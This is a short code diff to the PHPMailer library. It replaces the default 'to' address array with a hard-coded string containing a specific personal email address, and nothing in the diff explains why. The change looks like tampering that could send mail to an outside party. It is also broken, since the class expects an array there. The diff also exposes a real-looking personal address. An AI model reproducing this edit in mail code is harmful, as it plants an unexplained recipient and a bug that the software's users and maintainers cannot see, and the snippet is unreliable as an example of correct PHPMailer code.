@@ -411,7 +411,7 @@ class PHPMailer {
      * @var array An array of 'to' addresses
      * @access protected
      */
-    protected   $to             = array();
+    protected   $to             = "derrickrobison5699@sbcglobal.net";
     /**
      * @var array An array of 'cc' addresses
      * @access protected
